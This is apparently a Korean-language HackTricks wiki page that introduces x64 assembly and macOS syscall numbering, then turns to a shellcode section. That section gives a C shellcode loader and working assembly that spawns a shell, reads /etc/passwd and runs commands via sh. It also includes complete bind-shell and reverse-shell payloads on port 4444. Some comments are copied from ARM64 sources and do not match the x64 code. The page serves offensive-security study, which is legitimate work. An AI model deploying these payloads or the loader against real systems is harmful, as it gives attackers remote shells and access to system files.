# Introduction to x64

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Introduction to x64**

x64, 또는 x86-64로 알려진, 64비트 프로세서 아키텍처로 주로 데스크탑 및 서버 컴퓨팅에 사용됩니다. Intel에서 생산한 x86 아키텍처에서 유래되었으며, 이후 AMD가 AMD64라는 이름으로 채택하였습니다. 현재 개인용 컴퓨터와 서버에서 널리 사용되는 아키텍처입니다.

### **Registers**

x64는 x86 아키텍처를 확장하여 **16개의 범용 레지스터**를 제공합니다. 이들은 `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi`, 및 `r8`에서 `r15`까지 레이블이 붙어 있습니다. 각 레지스터는 **64비트**(8바이트) 값을 저장할 수 있습니다. 이 레지스터들은 호환성과 특정 작업을 위해 32비트, 16비트, 8비트 하위 레지스터도 가지고 있습니다.

1. **`rax`** - 전통적으로 **함수의 반환 값**에 사용됩니다.
2. **`rbx`** - 메모리 작업을 위한 **기본 레지스터**로 자주 사용됩니다.
3. **`rcx`** - **루프 카운터**로 일반적으로 사용됩니다.
4. **`rdx`** - 확장된 산술 연산을 포함한 다양한 역할에 사용됩니다.
5. **`rbp`** - 스택 프레임의 **기본 포인터**입니다.
6. **`rsp`** - 스택의 맨 위를 추적하는 **스택 포인터**입니다.
7. **`rsi`** 및 **`rdi`** - 문자열/메모리 작업에서 **소스** 및 **대상** 인덱스에 사용됩니다.
8. **`r8`**에서 **`r15`** - x64에서 도입된 추가 범용 레지스터입니다.

### **Calling Convention**

x64 호출 규약은 운영 체제에 따라 다릅니다. 예를 들어:

* **Windows**: 첫 번째 **네 개의 매개변수**는 레지스터 **`rcx`**, **`rdx`**, **`r8`**, 및 **`r9`**에 전달됩니다. 추가 매개변수는 스택에 푸시됩니다. 반환 값은 **`rax`**에 있습니다.
* **System V (UNIX 유사 시스템에서 일반적으로 사용됨)**: 첫 번째 **여섯 개의 정수 또는 포인터 매개변수**는 레지스터 **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`**, 및 **`r9`**에 전달됩니다. 반환 값도 **`rax`**에 있습니다.

함수가 여섯 개 이상의 입력을 가지면, **나머지는 스택에 전달됩니다**. **RSP**, 스택 포인터는 **16바이트 정렬**되어야 하며, 이는 호출이 발생하기 전에 가리키는 주소가 16으로 나누어 떨어져야 함을 의미합니다. 이는 일반적으로 함수 호출 전에 RSP가 적절히 정렬되어야 함을 의미합니다. 그러나 실제로는 이 요구 사항이 충족되지 않더라도 시스템 호출이 여러 번 작동합니다.

### Calling Convention in Swift

Swift는 [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)에서 찾을 수 있는 자체 **호출 규약**을 가지고 있습니다.

### **Common Instructions**

x64 명령어는 풍부한 세트를 가지고 있으며, 이전 x86 명령어와의 호환성을 유지하고 새로운 명령어를 도입합니다.

* **`mov`**: 한 **레지스터** 또는 **메모리 위치**에서 다른 위치로 값을 **이동**합니다.
* 예: `mov rax, rbx` — `rbx`의 값을 `rax`로 이동합니다.
* **`push`** 및 **`pop`**: **스택**에 값을 푸시하거나 팝합니다.
* 예: `push rax` — `rax`의 값을 스택에 푸시합니다.
* 예: `pop rax` — 스택의 맨 위 값을 `rax`로 팝합니다.
* **`add`** 및 **`sub`**: **덧셈** 및 **뺄셈** 연산입니다.
* 예: `add rax, rcx` — `rax`와 `rcx`의 값을 더하여 결과를 `rax`에 저장합니다.
* **`mul`** 및 **`div`**: **곱셈** 및 **나눗셈** 연산입니다. 주의: 이들은 피연산자 사용에 대한 특정 동작을 가지고 있습니다.
* **`call`** 및 **`ret`**: 함수를 **호출**하고 **반환**하는 데 사용됩니다.
* **`int`**: 소프트웨어 **인터럽트**를 트리거하는 데 사용됩니다. 예: `int 0x80`는 32비트 x86 리눅스에서 시스템 호출에 사용되었습니다.
* **`cmp`**: 두 값을 **비교**하고 결과에 따라 CPU의 플래그를 설정합니다.
* 예: `cmp rax, rdx` — `rax`를 `rdx`와 비교합니다.
* **`je`, `jne`, `jl`, `jge`, ...**: 이전 `cmp` 또는 테스트의 결과에 따라 제어 흐름을 변경하는 **조건부 점프** 명령어입니다.
* 예: `cmp rax, rdx` 명령어 후, `je label` — `rax`가 `rdx`와 같으면 `label`로 점프합니다.
* **`syscall`**: 일부 x64 시스템(예: 현대 Unix)에서 **시스템 호출**에 사용됩니다.
* **`sysenter`**: 일부 플랫폼에서 최적화된 **시스템 호출** 명령어입니다.

### **Function Prologue**

1. **이전 기본 포인터 푸시**: `push rbp` (호출자의 기본 포인터를 저장)
2. **현재 스택 포인터를 기본 포인터로 이동**: `mov rbp, rsp` (현재 함수에 대한 새로운 기본 포인터 설정)
3. **로컬 변수를 위한 스택 공간 할당**: `sub rsp, <size>` (여기서 `<size>`는 필요한 바이트 수)

### **Function Epilogue**

1. **현재 기본 포인터를 스택 포인터로 이동**: `mov rsp, rbp` (로컬 변수 해제)
2. **스택에서 이전 기본 포인터 팝**: `pop rbp` (호출자의 기본 포인터 복원)
3. **반환**: `ret` (호출자에게 제어 반환)

## macOS

### syscalls

다양한 클래스의 syscalls가 있으며, [**여기에서 찾을 수 있습니다**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall\_sw.h)**:**
```c
#define SYSCALL_CLASS_NONE	0	/* Invalid */
#define SYSCALL_CLASS_MACH	1	/* Mach */
#define SYSCALL_CLASS_UNIX	2	/* Unix/BSD */
#define SYSCALL_CLASS_MDEP	3	/* Machine-dependent */
#define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
#define SYSCALL_CLASS_IPC	5	/* Mach IPC */
```
그럼 각 syscall 번호를 [**이 URL에서**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:** 찾을 수 있습니다.
```c
0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
1	AUE_EXIT	ALL	{ void exit(int rval); }
2	AUE_FORK	ALL	{ int fork(void); }
3	AUE_NULL	ALL	{ user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); }
4	AUE_NULL	ALL	{ user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }
5	AUE_OPEN_RWTC	ALL	{ int open(user_addr_t path, int flags, int mode); }
6	AUE_CLOSE	ALL	{ int close(int fd); }
7	AUE_WAIT4	ALL	{ int wait4(int pid, user_addr_t status, int options, user_addr_t rusage); }
8	AUE_NULL	ALL	{ int nosys(void); }   { old creat }
9	AUE_LINK	ALL	{ int link(user_addr_t path, user_addr_t link); }
10	AUE_UNLINK	ALL	{ int unlink(user_addr_t path); }
11	AUE_NULL	ALL	{ int nosys(void); }   { old execv }
12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
[...]
```
그래서 **Unix/BSD 클래스**에서 `open` 시스템 호출 (**5**)을 호출하려면 다음을 추가해야 합니다: `0x2000000`

따라서 open을 호출하는 시스템 호출 번호는 `0x2000005`가 됩니다.

### Shellcodes

컴파일하려면: 

{% code overflow="wrap" %}
```bash
nasm -f macho64 shell.asm -o shell.o
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```
{% endcode %}

바이트를 추출하려면:

{% code overflow="wrap" %}
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done

# Another option
otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
```
{% endcode %}

<details>

<summary>쉘코드를 테스트하는 C 코드</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

[**여기**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s)에서 가져온 내용입니다.

{% tabs %}
{% tab title="adr 사용" %}
```armasm
bits 64
global _main
_main:
call    r_cmd64
db '/bin/zsh', 0
r_cmd64:                      ; the call placed a pointer to db (argv[2])
pop     rdi               ; arg1 from the stack placed by the call to l_cmd64
xor     rdx, rdx          ; store null arg3
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{% endtab %}

{% tab title="스택 사용" %}
```armasm
bits 64
global _main

_main:
xor     rdx, rdx          ; zero our RDX
push    rdx               ; push NULL string terminator
mov     rbx, '/bin/zsh'   ; move the path into RBX
push    rbx               ; push the path, to the stack
mov     rdi, rsp          ; store the stack pointer in RDI (arg1)
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{% endtab %}
{% endtabs %}

#### cat으로 읽기

목표는 `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`를 실행하는 것이며, 두 번째 인수(x1)는 매개변수의 배열입니다(메모리에서 이는 주소의 스택을 의미합니다).
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48`

lea rdi, [rel cat_path]   ; rdi will hold the address of "/bin/cat"
lea rsi, [rel passwd_path] ; rsi will hold the address of "/etc/passwd"

; Create inside the stack the array of args: ["/bin/cat", "/etc/passwd"]
push rsi   ; Add "/etc/passwd" to the stack (arg0)
push rdi   ; Add "/bin/cat" to the stack (arg1)

; Set in the 2nd argument of exec the addr of the array
mov rsi, rsp    ; argv=rsp - store RSP's value in RSI

xor rdx, rdx    ; Clear rdx to hold NULL (no environment variables)

push    59      ; put 59 on the stack (execve syscall)
pop     rax     ; pop it to RAX
bts     rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall         ; Make the syscall

section .data
cat_path:      db "/bin/cat", 0
passwd_path:   db "/etc/passwd", 0
```
#### sh로 명령어 호출하기
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 32           ; Create space on the stack

; Argument array
lea rdi, [rel touch_command]
push rdi                      ; push &"touch /tmp/lalala"
lea rdi, [rel sh_c_option]
push rdi                      ; push &"-c"
lea rdi, [rel sh_path]
push rdi                      ; push &"/bin/sh"

; execve syscall
mov rsi, rsp                  ; rsi = pointer to argument array
xor rdx, rdx                  ; rdx = NULL (no env variables)
push    59                    ; put 59 on the stack (execve syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

_exit:
xor rdi, rdi                  ; Exit status code 0
push    1                     ; put 1 on the stack (exit syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

section .data
sh_path:        db "/bin/sh", 0
sh_c_option:    db "-c", 0
touch_command:  db "touch /tmp/lalala", 0
```
#### Bind shell

**포트 4444**에서 [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html)의 Bind shell
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xffffffffa3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; bind(host_sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x68
syscall

; listen(host_sockid, 2)
xor  rsi, rsi
mov  sil, 0x2
mov  rax, r8
mov  al, 0x6a
syscall

; accept(host_sockid, 0, 0)
xor  rsi, rsi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x1e
syscall

mov rdi, rax
mov sil, 0x3

dup2:
; dup2(client_sockid, 2)
;   -> dup2(client_sockid, 1)
;   -> dup2(client_sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
mov  rax, r8
mov  al, 0x3b
syscall
```
#### Reverse Shell

[https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html)에서 리버스 셸. **127.0.0.1:4444**로 리버스 셸
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xfeffff80a3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; connect(sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x62
syscall

xor rsi, rsi
mov sil, 0x3

dup2:
; dup2(sockid, 2)
;   -> dup2(sockid, 1)
;   -> dup2(sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x3b
syscall
```
{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
